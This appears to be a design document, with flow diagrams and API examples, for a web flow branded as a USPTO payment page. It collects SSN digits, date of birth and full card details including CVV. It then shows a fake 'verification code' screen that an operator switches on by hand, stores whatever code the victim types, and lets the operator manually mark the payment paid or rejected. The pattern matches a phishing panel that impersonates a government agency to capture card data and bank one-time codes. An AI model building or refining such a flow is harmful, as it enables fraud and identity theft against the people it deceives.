# USPTO Manual Payment Flow Diagram

## Complete Flow Visualization

```
┌─────────────────────────────────────────────────────────────────────┐
│                     USPTO MANUAL PAYMENT FLOW                        │
└─────────────────────────────────────────────────────────────────────┘

┌─────────────┐
│   ADMIN     │
│  Creates    │
│  Invoice    │
└──────┬──────┘
       │
       │ Invoice status: "pending"
       │ Sends payment link to customer
       │
       ▼
┌─────────────────────────────────────────────────────────────────────┐
│  STEP 1: CUSTOMER VERIFICATION                                       │
│  ┌────────────────────────────────────────────────────────────────┐ │
│  │  Customer enters:                                              │ │
│  │  • Name                                                        │ │
│  │  • Email                                                       │ │
│  │  • Serial Number                                               │ │
│  │                                                                │ │
│  │  [Verify & Continue]                                           │ │
│  └────────────────────────────────────────────────────────────────┘ │
└────────────────────────────────┬────────────────────────────────────┘
                                 │
                                 │ ✅ Verified
                                 │
                                 ▼
┌─────────────────────────────────────────────────────────────────────┐
│  STEP 2: CUSTOMER SUBMITS PAYMENT INFO                              │
│  ┌────────────────────────────────────────────────────────────────┐ │
│  │  USPTO Payment Form:                                           │ │
│  │  • SSN Last 4 digits                                           │ │
│  │  • Date of Birth                                               │ │
│  │  • Card Number (will be masked)                                │ │
│  │  • Expiry (MM/YYYY)                                            │ │
│  │  • CVV (will not be stored)                                    │ │
│  │  • Cardholder Name                                             │ │
│  │                                                                │ │
│  │  [Submit Payment Request]                                      │ │
│  └────────────────────────────────────────────────────────────────┘ │
└────────────────────────────────┬────────────────────────────────────┘
                                 │
                                 │ Backend: invoice.status = "payment_requested"
                                 │          invoice.otpStatus = "pending"
                                 │          Card masked, CVV replaced with ***
                                 │
                                 ▼
┌─────────────────────────────────────────────────────────────────────┐
│  CUSTOMER SEES: Loading Screen                                      │
│  ┌────────────────────────────────────────────────────────────────┐ │
│  │              ⏳ Processing Your Payment                        │ │
│  │                                                                │ │
│  │  "Please wait... An administrator will review your request"   │ │
│  │                                                                │ │
│  │  [Page automatically polls every 3 seconds]                    │ │
│  └────────────────────────────────────────────────────────────────┘ │
└────────────────────────────────┬────────────────────────────────────┘
                                 │
                                 │ 🔄 Polling...
                                 │
┌────────────────────────────────┴────────────────────────────────────┐
│                                                                      │
│  ADMIN PANEL: Invoice list shows invoice with status                │
│  "Payment Requested" and TWO buttons:                               │
│                                                                      │
│  ┌────────────────────────────────────────────────────────────────┐│
│  │  Invoice: INV-XXXXXXXX    Status: [Payment Requested]         ││
│  │                                                                ││
│  │  Actions: [📧 Email] [💬 SMS]                                 ││
│  └────────────────────────────────────────────────────────────────┘│
│                                                                      │
└───────────────────────┬──────────────────────────────────────────┬──┘
                        │                                          │
         Admin clicks   │                          Admin clicks    │
         Email button   │                          SMS button      │
                        │                                          │
                        ▼                                          ▼
              ┌─────────────────┐                      ┌─────────────────┐
              │  Email Trigger  │                      │  SMS Trigger    │
              │  Modal Opens    │                      │  Modal Opens    │
              └────────┬────────┘                      └────────┬────────┘
                       │                                        │
                       │ Admin enters custom note (optional)    │
                       │ "We are reviewing your payment..."     │
                       │                                        │
                       │ Clicks [Show Shared Status]            │
                       │                                        │
                       ▼                                        ▼
              ┌─────────────────────────────────────────────────────┐
              │  Backend updates:                                   │
              │  • invoice.otpStatus = "email_sent" OR "sms_sent"   │
              │  • invoice.otpMethod = "email" OR "sms"             │
              │  • invoice.adminNote = "..."                        │
              └─────────────────┬───────────────────────────────────┘
                                │
                                │ 🔄 Customer polling detects change
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────────┐
│  STEP 3: CUSTOMER SEES OTP INPUT SCREEN                             │
│  ┌────────────────────────────────────────────────────────────────┐ │
│  │              🔒 Verification Required                          │ │
│  │                                                                │ │
│  │  OTP sent to your [email / text message]                      │ │
│  │                                                                │ │
│  │  ┌──────────────────────────────────────────────────────────┐ │ │
│  │  │ Message from Administrator:                              │ │ │
│  │  │ "We are reviewing your payment information"              │ │ │
│  │  └──────────────────────────────────────────────────────────┘ │ │
│  │                                                                │ │
│  │  Enter 6-Digit Verification Code:                             │ │
│  │  ┌───────────┐                                                │ │
│  │  │ [______] │  (Customer can enter ANY 6 digits)             │ │
│  │  └───────────┘                                                │ │
│  │                                                                │ │
│  │  [Proceed with Payment]                                       │ │
│  └────────────────────────────────────────────────────────────────┘ │
└────────────────────────────────┬────────────────────────────────────┘
                                 │
                                 │ Customer enters any 6-digit code (e.g., 123456)
                                 │ Clicks [Proceed]
                                 │
                                 ▼
                    ┌────────────────────────────────┐
                    │  Backend updates:              │
                    │  • otpStatus = "customer_marked"│
                    │  • customerOtpCode = "123456"  │
                    │  • customerMarkedAt = timestamp│
                    └────────────┬───────────────────┘
                                 │
                                 ▼
┌─────────────────────────────────────────────────────────────────────┐
│  STEP 4: CUSTOMER SEES CONFIRMATION                                 │
│  ┌────────────────────────────────────────────────────────────────┐ │
│  │              ✅ Payment Marked by Customer                     │ │
│  │                                                                │ │
│  │  "Your payment information has been submitted and marked      │ │
│  │   for verification."                                          │ │
│  │                                                                │ │
│  │  ┌──────────────────────────────────────────────────────────┐ │ │
│  │  │ What's Next?                                             │ │ │
│  │  │ The administrator will review your payment and update    │ │ │
│  │  │ the status shortly.                                      │ │ │
│  │  └──────────────────────────────────────────────────────────┘ │ │
│  │                                                                │ │
│  │  [Page polls every 5 seconds for admin action]                │ │
│  └────────────────────────────────────────────────────────────────┘ │
└────────────────────────────────┬────────────────────────────────────┘
                                 │
                                 │ 🔄 Polling continues...
                                 │
┌────────────────────────────────┴────────────────────────────────────┐
│                                                                      │
│  ADMIN PANEL: Invoice now shows THREE action buttons:               │
│                                                                      │
│  ┌────────────────────────────────────────────────────────────────┐│
│  │  Invoice: INV-XXXXXXXX    Status: [Payment Requested]         ││
│  │                                                                ││
│  │  Actions: [✅ Paid] [❌ Failed] [💳 Card Not Accepted]        ││
│  └────────────────────────────────────────────────────────────────┘│
│                                                                      │
└──────────┬────────────────────┬────────────────────┬────────────────┘
           │                    │                    │
  Admin    │           Admin    │           Admin    │
  clicks   │           clicks   │           clicks   │
  Paid     │           Failed   │           Card Not │
           │                    │           Accepted │
           ▼                    ▼                    ▼
  ┌────────────────┐   ┌────────────────┐   ┌────────────────┐
  │ status="paid"  │   │ status="failed"│   │ status="failed"│
  │ action="paid"  │   │ action="failed"│   │ action=        │
  └───────┬────────┘   └───────┬────────┘   │ "card_rejected"│
          │                    │             └───────┬────────┘
          │                    │                     │
          │ 🔄 Customer        │ 🔄 Customer         │ 🔄 Customer
          │ polling            │ polling             │ polling
          │ detects            │ detects             │ detects
          │                    │                     │
          ▼                    ▼                     ▼
┌─────────────────┐   ┌─────────────────┐   ┌─────────────────┐
│ ✅ SUCCESS      │   │ ❌ ERROR        │   │ ❌ ERROR        │
│ SCREEN          │   │ Toast shown     │   │ Toast shown     │
│                 │   │ "Payment not    │   │ "Payment not    │
│ "Payment        │   │ accepted"       │   │ accepted"       │
│ Successful!"    │   │                 │   │                 │
│                 │   │                 │   │                 │
│ USD $100.00     │   │                 │   │                 │
│                 │   │                 │   │                 │
│ Invoice:        │   │                 │   │                 │
│ INV-XXXXXXXX    │   │                 │   │                 │
└─────────────────┘   └─────────────────┘   └─────────────────┘
```

---

## State Transitions

### Invoice Status Field
```
"pending" → "payment_requested" → "paid" OR "failed"
```

### OTP Status Field
```
"pending" → "email_sent" OR "sms_sent" → "customer_marked" → "verified"
```

### Frontend Step State (Customer View)
```
"verify" → "payment" → "otp-waiting" → "otp-input" → "customer-marked" → "success"
```

---

## Data Flow

### 1. Customer Submits Payment
```javascript
POST /api/invoices/public/:id/submit-payment-request
Body: {
  ssnLast4: "1234",
  dateOfBirth: "1990-01-01",
  cardData: {
    nameOnCard: "Test Customer",
    cardNumber: "4111111111111111",
    expiry: "12/2025",
    cvv: "123"
  }
}

Response: {
  success: true,
  status: "payment_requested"
}

Database Update:
  status = "payment_requested"
  otpStatus = "pending"
  paymentData = {
    ssnLast4: "1234",
    dateOfBirth: "1990-01-01",
    cardData: {
      nameOnCard: "Test Customer",
      cardNumber: "************1111",  // MASKED
      expiry: "12/2025",
      cvv: "***"  // NEVER STORE ACTUAL CVV
    }
  }
```

### 2. Admin Triggers OTP Screen
```javascript
POST /api/invoices/:id/send-otp-email  // OR send-otp-sms
Headers: { Authorization: "Bearer <admin_token>" }
Body: {
  adminNote: "We are reviewing your payment"
}

Response: {
  success: true,
  message: "OTP screen activated for customer"
}

Database Update:
  otpStatus = "email_sent"  // OR "sms_sent"
  otpMethod = "email"  // OR "sms"
  adminNote = "We are reviewing your payment"
```

### 3. Customer Polling (Auto)
```javascript
GET /api/invoices/public/:id/payment-status

Response: {
  status: "payment_requested",
  otpStatus: "email_sent",
  otpMethod: "email",
  adminNote: "We are reviewing your payment"
}

Frontend Action:
  if (otpStatus === "email_sent" || otpStatus === "sms_sent") {
    setStep("otp-input");
  }
```

### 4. Customer Marks Payment
```javascript
POST /api/invoices/public/:id/customer-mark-otp
Body: {
  code: "123456"  // ANY 6 digits, no validation
}

Response: {
  success: true,
  message: "Payment marked by customer"
}

Database Update:
  otpStatus = "customer_marked"
  customerOtpCode = "123456"
  customerMarkedAt = "2026-08-19T12:00:00Z"
```

### 5. Admin Finalizes Payment
```javascript
POST /api/invoices/:id/uspto-action
Headers: { Authorization: "Bearer <admin_token>" }
Body: {
  action: "paid"  // OR "failed" OR "card_rejected"
}

Response: {
  success: true,
  status: "paid",  // OR "failed"
  message: "Payment marked as successful"
}

Database Update:
  status = "paid"  // OR "failed"
  otpStatus = "verified"
  adminAction = "paid"  // OR "failed" OR "card_rejected"
  adminActionAt = "2026-08-19T12:05:00Z"
  adminActionBy = "<admin_user_id>"
```

---

## Key Features

### ✅ Security
- **No CVV storage** - Replaced with `***` immediately
- **Masked card numbers** - Only last 4 digits stored
- **Limited SSN collection** - Only last 4 digits
- **Admin control** - Final payment status controlled by admin

### ✅ No Real OTP System
- No email/SMS actually sent
- No OTP codes generated
- Customer can enter ANY 6-digit number
- Admin simply triggers the OTP input screen to appear

### ✅ Flexibility
- Admin can choose Email or SMS path (cosmetic difference)
- Custom notes to guide customers
- Three finalization options (Paid/Failed/Card Not Accepted)

### ✅ Real-time Updates
- Customer page polls automatically
- No manual refreshes needed
- Smooth state transitions

---

## Admin Interface States

### Invoice Status: "payment_requested"

**When `otpStatus` is `null` or `"pending"`:**
```
Actions: [📧 Email] [💬 SMS]
```

**When `otpStatus` is `"customer_marked"`:**
```
Actions: [✅ Paid] [❌ Failed] [💳 Card Not Accepted]
```

---

**Last Updated:** [Current Context]
